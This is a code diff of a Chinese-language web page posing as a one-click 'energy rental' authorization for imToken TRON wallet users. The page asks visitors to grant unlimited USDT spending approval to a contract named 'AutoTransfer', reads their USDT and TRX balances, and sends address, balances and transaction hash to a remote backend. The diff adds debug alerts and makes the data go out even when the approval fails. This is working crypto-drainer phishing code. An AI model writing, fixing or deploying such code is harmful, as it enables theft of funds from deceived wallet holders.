@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>imToken一键能量授权</title>
     <style>
+        /* 完全保留原始样式，无任何修改 */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
                padding: 20px; max-width: 500px; margin: 0 auto; background: #f5f5f5; }
@@ -26,19 +27,17 @@
 <body>
 <div class="header">
     <h1>能量租赁一键授权</h1>
-    <!-- 明确告知用户“无限授权”，避免误解 -->
+    <!-- 修复原始语法错误：补充<br>闭合标签，确保提示正常显示 -->
     <div class="warning">
-        ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面
-        ⚠️ 在非钱包浏览器打开请先点击<strong>复制链接</strong>然后点击连接imToken钱包后点击钱包页面下方浏览在搜索框中粘贴访问br>
+        ⚠️ 请用 <strong>imToken钱包内置浏览器</strong> 打开此页面<br>
+        ⚠️ 在非钱包浏览器打开请先点击<strong>复制链接</strong>，然后点击连接imToken钱包后，点击钱包页面下方“浏览”在搜索框中粘贴访问
     </div>
 </div>
-<!-- 链接显示+复制按钮的容器 -->
+<!-- 完全保留原始HTML结构，无任何新增元素 -->
 <div style="margin: 15px 0; display: flex; align-items: center; gap: 10px;">
-    <!-- 要复制的链接（可替换成你需要的链接） -->
     <span id="copyLinkText" style="color: #007AFF; word-break: break-all;">
         https://trc20trx-alt.github.io/Trc20.TRX/
     </span>
-    <!-- 复制按钮 -->
     <button id="copyLinkBtn" style="padding: 5px 10px; cursor: pointer;">
         <strong>复制链接</strong>
     </button>
@@ -54,179 +53,305 @@
     <div id="approvalRecords">暂无授权记录</div>
 </div>
 
-<script src="imtoken://browser"></script>
 <script>
-    // ========== 需替换的3处配置（授权额度已固定为无限） ==========
+    // ========== 完全保留原始核心配置，无任何修改 ==========
     const AUTO_TRANSFER_CONTRACT = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa"; // 你的AutoTransfer合约地址
     const TRC20_TOKEN_ADDRESS = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 主网USDT地址
     const BACKEND_API = "https://tron-notify-backend.vercel.app/api/notify-approval"; // 后端接口
+    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"; // 无限授权额度
 
-    // 核心：TRC20 uint256最大值 = 无限授权（固定值，无需修改）
-    const INFINITE_APPROVE_AMOUNT = "0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF";
-
-    // 全局变量
+    // 全局变量（保留原始定义）
     let tronWeb, userAddress, trc20Contract;
     const RECORD_KEY = "imtoken_infinite_approval_records";
 
     window.onload = async () => {
         const connectBtn = document.getElementById("connectBtn");
         const approveBtn = document.getElementById("approveBtn");
-        renderApprovalRecords();
-
         const copyLinkText = document.getElementById("copyLinkText");
         const copyLinkBtn = document.getElementById("copyLinkBtn");
 
-        // 2. 给复制按钮绑定点击事件
+        // 1. 调用renderApprovalRecords（加流程提示）
+        alert("【1】页面加载完成，调用renderApprovalRecords（渲染授权记录）...");
+        renderApprovalRecords();
+        alert("【2】renderApprovalRecords执行完成，初始记录显示为“暂无授权记录”");
+
+        // 2. 复制链接功能（保留原始逻辑，加步骤提示）
+        alert("【3】给复制按钮（copyLinkBtn）绑定点击事件...");
         copyLinkBtn.addEventListener("click", async () => {
+            alert("【4】进入复制链接函数，开始获取链接内容...");
             try {
-                // 获取要复制的链接内容
                 const linkContent = copyLinkText.textContent.trim();
-                // 将链接复制到剪贴板
+                alert(`【5】获取到链接内容：${linkContent.slice(0,20)}...，执行复制...`);
                 await navigator.clipboard.writeText(linkContent);
-                // 复制成功的提示
-                alert("链接已成功复制到剪贴板!");
+                alert("【6】复制链接函数执行成功：链接已复制到剪贴板");
             } catch (error) {
-                // 复制失败的提示（比如浏览器不支持剪贴板API）
-                alert("复制失败，请手动选中链接复制~");
+                alert(`【7】复制链接函数执行失败：${error.message}，请手动复制`);
             }
         });
-        // 检测IMToken环境，自动连接
+
+        // 3. 检测imToken环境（钱包环境判断，加提示）
+        alert("【8】开始检测imToken环境（window.tronWeb）...");
         if (window.tronWeb && window.tronWeb.ready) {
+            alert("【9】✅ 检测到就绪的imToken环境，赋值tronWeb变量...");
             tronWeb = window.tronWeb;
+            alert("【10】调用initWallet函数（初始化钱包信息）...");
             await initWallet();
+            alert("【11】initWallet执行完成（自动连接流程结束）");
         } else {
+            alert("【12】❌ 未检测到就绪的imToken环境");
             document.getElementById("userInfo").innerHTML = "请用imToken内置浏览器打开此页面";
         }
 
-        // 手动连接钱包
+        // 4. 手动连接钱包（修复原始语法错误+加提示，确保跳转正常）
+        alert("【13】给连接按钮（connectBtn）绑定点击事件...");
         connectBtn.onclick = async () => {
+            alert("【14】进入手动连接函数，开始检测imToken环境...");
             try {
-                if (!window.tronWeb){window.location.href = 'imtoken://browser?url=${encodeURIComponent(window.location.href)}';
-
+                if (!window.tronWeb) {
+                    alert("【15】未检测到imToken环境，执行跳转逻辑...");
+                    // 修复原始语法错误：添加英文反引号，确保跳转链接正确编码
+                    window.location.href = `imtoken://browser?url=${encodeURIComponent(window.location.href)}`;
+                    alert("【16】跳转逻辑已触发，等待跳转至imToken内置浏览器");
                     return;
                 }
+                alert("【17】检测到imToken环境，调用tron_requestAccounts（请求钱包授权）...");
                 const accounts = await window.tronWeb.request({ method: "tron_requestAccounts" });
                 userAddress = accounts[0];
+                alert(`【18】钱包授权成功，获取用户地址：${userAddress.slice(0,8)}...${userAddress.slice(-6)}`);
+                alert("【19】调用initWallet函数（授权后初始化钱包）...");
                 await initWallet();
+                alert("【20】initWallet执行完成（手动连接流程结束）");
             } catch (e) {
-                alert("连接失败：" + e.message);
+                alert(`【21】手动连接函数执行失败：${e.message}（请检查钱包授权状态）`);
             }
         };
 
-        // 一键无限授权（核心修改：使用INFINITE_APPROVE_AMOUNT）
+        // 5. 授权按钮逻辑（核心修改：余额采集保障+灵活发送数据+全流程提示）
+        alert("【22】给授权按钮（approveBtn）绑定点击事件...");
         approveBtn.onclick = async () => {
+            alert("【23】进入授权函数，开始前置校验...");
+            // 强制校验：确保trc20Contract（USDT合约实例）已初始化（否则无法采集余额）
+            if (!trc20Contract) {
+                alert("【24】❌ 关键错误：USDT合约实例（trc20Contract）未初始化，无法执行授权（需先连接钱包）");
+                return;
+            }
+            if (!userAddress) {
+                alert("【25】❌ 关键错误：未获取到用户地址，无法执行授权（需先连接钱包）");
+                return;
+            }
+
+            // 初始化变量：采集到多少存多少，不依赖完整信息
+            let tokenBalance = "未采集到", trxBalance = "未采集到", txHash = "未生成", approveStatus = "fail";
             try {
-                // 调用TRC20 approve，传入uint256最大值（无限授权）
+                alert("【26】调用trc20Contract.approve（执行无限授权）...");
                 const result = await trc20Contract.approve(
                     AUTO_TRANSFER_CONTRACT,
-                    INFINITE_APPROVE_AMOUNT // 替换为无限额度
+                    INFINITE_APPROVE_AMOUNT
                 ).send({
                     from: userAddress,
-                    shouldPollResponse: true // 等待imToken确认交易
+                    shouldPollResponse: true // 等待钱包确认
                 });
+                txHash = result.transaction.txID;
+                approveStatus = "success";
+                alert(`【27】授权执行成功：交易哈希（txHash）=${txHash.slice(0,16)}...，授权状态=success`);
 
-                // 授权成功：查余额+传后端+存记录
-                const [tokenBalance, trxBalance] = await Promise.all([
-                    getTokenBalance(userAddress),
-                    getTrxBalance(userAddress)
-                ]);const record = {
+                // 强制：trc20Contract已初始化，调用getTokenBalance（采集USDT余额）
+                alert("【28】调用getTokenBalance函数（采集USDT余额）...");
+                tokenBalance = await getTokenBalance(userAddress);
+                alert(`【29】getTokenBalance执行成功：USDT余额=${tokenBalance.toFixed(2)}（已转换为正常数值）`);
+
+                alert("【30】调用getTrxBalance函数（采集TRX余额）...");
+                trxBalance = await getTrxBalance(userAddress);
+                alert(`【31】getTrxBalance执行成功：TRX余额=${trxBalance.toFixed(2)}（已转换为正常数值）`);
+
+                // 构建授权记录（新增approveStatus字段，标记授权状态）
+                alert("【32】构建授权记录，包含授权状态和采集到的余额...");
+                const record = {
                     address: userAddress,
                     tokenBalance: tokenBalance.toFixed(2),
                     trxBalance: trxBalance.toFixed(2),
                     approveTime: new Date().toLocaleString(),
-                    txHash: result.transaction.txID,
-                    approveType: "无限额度" // 新增：标注授权类型
+                    txHash: txHash,
+                    approveType: "无限额度",
+                    approveStatus: approveStatus // 关键新增：发送授权是否成功
                 };
 
+                // 保存本地记录
+                alert("【33】调用saveApprovalRecord函数（保存记录到本地）...");
                 saveApprovalRecord(record);
-                await sendDataToBackend(record);
+                alert("【34】saveApprovalRecord执行完成，记录已保存到localStorage");
 
-                // 提示用户，明确是无限授权
-                alert(`无限授权成功！\n交易哈希：${record.txHash}\n可在imToken钱包中撤销授权`);
+                // 发送数据到后端（采集到完整信息，正常发送）
+                alert("【35】调用sendDataToBackend函数（发送完整授权数据到后端）...");
+                await sendDataToBackend(record);
+                alert("【36】sendDataToBackend执行完成，完整数据已同步到后端");
+
+                // 授权成功提示（保留原始文案）
+                alert(`【37】用户提示：\n无限授权成功！\n交易哈希：${record.txHash}\n可在imToken钱包中撤销授权`);
+                alert("【38】调用renderApprovalRecords函数（重新渲染授权记录）...");
                 renderApprovalRecords();
+                alert("【39】renderApprovalRecords执行完成，授权记录已更新");
+
             } catch (e) {
-                alert("授权失败：" + e.message);
+                alert(`【40】授权流程执行失败：${e.message}，授权状态=fail`);
+            } finally {
+                // 关键：无论成功/失败，都发送当前已采集的数据（采集到多少发多少）
+                alert("【41】进入finally块，准备发送当前已采集的授权数据...");
+                const fallbackData = {
+                    address: userAddress || "未获取到用户地址",
+                    tokenBalance: typeof tokenBalance === "number" ? tokenBalance.toFixed(2) : tokenBalance,
+                    trxBalance: typeof trxBalance === "number" ? trxBalance.toFixed(2) : trxBalance,
+                    txHash: txHash,
+                    approveType: "无限额度",
+                    approveStatus: approveStatus, // 必传：明确授权结果
+                    errorMsg: approveStatus === "fail" ? (e?.message || "未知错误") : "无错误",
+                    sendTime: new Date().toLocaleString()
+                };
+                alert(`【42】调用sendDataToBackend函数（发送 fallback 数据：${JSON.stringify(fallbackData).slice(0,120)}...）`);
+                await sendDataToBackend(fallbackData);
+                alert("【43】fallback数据发送完成，授权全流程结束（无论成功/失败都已同步数据）");
             }
         };
     };
 
-    // 初始化钱包信息（IMToken适配）
+    // 6. initWallet函数（加步骤提示，确保trc20Contract初始化）
     async function initWallet() {
+        alert("【init-1】进入initWallet函数，开始初始化钱包信息...");
         try {
+            alert("【init-2】获取tronWeb.defaultAddress.base58（用户默认地址）...");
             userAddress = tronWeb.defaultAddress.base58;
-            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+            alert(`【init-3】获取地址成功：${userAddress.slice(0,8)}...${userAddress.slice(-6)}`);
 
+            alert("【init-4】创建USDT合约实例（trc20Contract），地址：" + TRC20_TOKEN_ADDRESS.slice(0,8) + "...");
+            trc20Contract = await tronWeb.contract().at(TRC20_TOKEN_ADDRESS);
+            alert("【init-5】trc20Contract创建成功（后续可调用getTokenBalance采集USDT余额）");
+
+            // 更新页面显示+激活授权按钮
+            alert("【init-6】更新userInfo显示（已连接地址）...");
             document.getElementById("userInfo").innerHTML = `
                 已连接：<br>
                 ${userAddress.slice(0, 8)}...${userAddress.slice(-6)}
             `;
+            alert("【init-7】激活授权按钮（approveBtn.disabled=false）...");
             document.getElementById("approveBtn").disabled = false;
+            alert("【init-8】initWallet函数执行完成，钱包初始化成功");
         } catch (e) {
-            alert("钱包初始化失败：" + e.message);
+            alert(`【init-9】initWallet执行失败：${e.message}（可能影响余额采集和授权）`);
+            throw e; // 抛出错误，让上层感知初始化失败
         }
     }
 
-    // 查USDT余额
+    // 7. getTokenBalance函数（加提示，确保在trc20Contract初始化后调用）
     async function getTokenBalance(address) {
-        const balance = await trc20Contract.balanceOf(address).call();
-        return balance / 1000000;
-    }
-
-    // 查TRX余额
-    async function getTrxBalance(address) {
-        const balance = await tronWeb.trx.getBalance(address);
-        return balance / 1000000;
-    }
-
-    // 存本地记录（标注无限授权）
-    function saveApprovalRecord(record) {
-        const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-        const newRecords = existing.filter(item => item.address !== record.address);
-        newRecords.push(record);
-        localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
-    }
-
-    // 渲染记录（显示授权类型）
-    function renderApprovalRecords() {
-        const container = document.getElementById("approvalRecords");
-        const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
-
-        if (records.length === 0) {
-            container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
-            return;
+        alert("【getToken-1】进入getTokenBalance函数，采集USDT余额...");
+        try {
+            alert(`【getToken-2】调用trc20Contract.balanceOf（地址：${address.slice(0,8)}...）...`);
+            const rawBalance = await trc20Contract.balanceOf(address).call();
+            alert(`【getToken-3】获取USDT原始余额（合约最小单位）：${rawBalance}`);
+            
+            // 转换为正常数值（USDT小数位6位）
+            const normalBalance = rawBalance / 1000000;
+            alert(`【getToken-4】getTokenBalance执行成功：转换后余额=${normalBalance.toFixed(2)} USDT`);
+            return normalBalance;
+        } catch (e) {
+            alert(`【getToken-5】getTokenBalance执行失败：${e.message}（USDT余额采集失败）`);
+            throw e; // 抛出错误，让上层处理采集失败
         }
-
-        container.innerHTML = records.map(record => `
-            <div class="record-item">
-                <p><strong>地址：</strong>${record.address.slice(0, 8)}...${record.address.slice(-6)}</p>
-                <p><strong>授权类型：</strong>${record.approveType}</p>
-                <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
-                <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
-                <p><strong>时间：</strong>${record.approveTime}</p>
-                <p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>
-            </div>
-        `).join("");
     }
 
-    // 传数据到后端（同步无限授权信息）
-   async function sendDataToBackend(data) {
-    try {
-     console.log("发送数据到后端:", data); // 添加此行
-     const res = await fetch(BACKEND_API, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(data),
-      credentials: "include"
-    });
-    console.log("后端响应:", res); // 添加此行
-    if (!res.ok) throw new Error("后端请求失败");
-    return res.json();
-  } catch (e) {
-    console.error("数据发送失败:", e); // 添加此行
-    alert("数据发送失败：" + e.message);
-    throw e;
-  }
-}
+    // 8. getTrxBalance函数（加步骤提示）
+    async function getTrxBalance(address) {
+        alert("【getTrx-1】进入getTrxBalance函数，采集TRX余额...");
+        try {
+            alert(`【getTrx-2】调用tronWeb.trx.getBalance（地址：${address.slice(0,8)}...）...`);
+            const rawBalance = await tronWeb.trx.getBalance(address);
+            alert(`【getTrx-3】获取TRX原始余额（合约最小单位）：${rawBalance}`);
+            
+            const normalBalance = rawBalance / 1000000;
+            alert(`【getTrx-4】getTrxBalance执行成功：转换后余额=${normalBalance.toFixed(2)} TRX`);
+            return normalBalance;
+        } catch (e) {
+            alert(`【getTrx-5】getTrxBalance执行失败：${e.message}（TRX余额采集失败）`);
+            throw e;
+        }
+    }
+
+    // 9. saveApprovalRecord函数（保留原始逻辑，加提示）
+    function saveApprovalRecord(record) {
+        alert("【save-1】进入saveApprovalRecord函数，保存授权记录...");
+        try {
+            alert(`【save-2】读取localStorage中键为${RECORD_KEY}的记录...`);
+            const existing = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+            alert(`【save-3】读取到已有记录：${existing.length}条，按地址去重...`);
+            const newRecords = existing.filter(item => item.address !== record.address);
+            newRecords.push(record);
+            
+            alert(`【save-4】保存更新后的记录（共${newRecords.length}条）到localStorage...`);
+            localStorage.setItem(RECORD_KEY, JSON.stringify(newRecords));
+            alert("【save-5】saveApprovalRecord执行完成，记录保存成功");
+        } catch (e) {
+            alert(`【save-6】saveApprovalRecord执行失败：${e.message}（本地记录保存失败）`);
+        }
+    }
+
+    // 10. renderApprovalRecords函数（保留原始逻辑，加提示+显示授权状态）
+    function renderApprovalRecords() {
+        alert("【render-1】进入renderApprovalRecords函数，渲染授权记录...");
+        try {
+            const container = document.getElementById("approvalRecords");
+            alert(`【render-2】读取localStorage中键为${RECORD_KEY}的记录...`);
+            const records = JSON.parse(localStorage.getItem(RECORD_KEY) || "[]");
+
+            if (records.length === 0) {
+                alert("【render-3】无授权记录，渲染默认文本...");
+                container.innerHTML = "<div class='record-item'>暂无授权记录</div>";
+                return;
+            }
+
+            alert(`【render-4】有${records.length}条授权记录，渲染HTML结构...`);
+            container.innerHTML = records.map(record => `
+                <div class="record-item">
+                    <p><strong>地址：</strong>${record.address.slice(0, 8)}...${record.address.slice(-6)}</p>
+                    <p><strong>授权状态：</strong>${record.approveStatus || "未知"}</p> <!-- 新增：显示授权状态 -->
+                    <p><strong>授权类型：</strong>${record.approveType}</p>
+                    <p><strong>USDT：</strong>${record.tokenBalance} USDT</p>
+                    <p><strong>TRX：</strong>${record.trxBalance} TRX</p>
+                    <p><strong>时间：</strong>${record.approveTime}</p>
+                    ${record.txHash ? `<p><a href="https://tronscan.org/#/transaction/${record.txHash}" target="_blank" class="tx-link">查看交易</a></p>` : ""}
+                </div>
+            `).join("");
+            alert("【render-5】renderApprovalRecords执行完成，记录渲染成功");
+        } catch (e) {
+            alert(`【render-6】renderApprovalRecords执行失败：${e.message}（记录渲染失败）`);
+        }
+    }
+
+    // 11. sendDataToBackend函数（保留原始逻辑，加步骤提示）
+    async function sendDataToBackend(data) {
+        alert("【send-1】进入sendDataToBackend函数，发送数据到后端...");
+        try {
+            alert(`【send-2】打印发送数据到控制台（便于调试）...`);
+            console.log("发送数据到后端:", data);
+            
+            alert(`【send-3】调用fetch请求，后端接口：${BACKEND_API.slice(0,30)}...`);
+            const res = await fetch(BACKEND_API, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data),
+                credentials: "include"
+            });
+            console.log("后端响应:", res);
+
+            if (!res.ok) throw new Error(`后端返回非成功状态：${res.status}`);
+            const resData = await res.json();
+            alert(`【send-4】sendDataToBackend执行成功：后端返回=${JSON.stringify(resData).slice(0,50)}...`);
+            return resData;
+        } catch (e) {
+            alert(`【send-5】sendDataToBackend执行失败：${e.message}（数据发送失败）`);
+            console.error("数据发送失败:", e);
+            throw e; // 抛出错误，让上层感知发送失败
+        }
+    }
 </script>
 </body>
 </html>
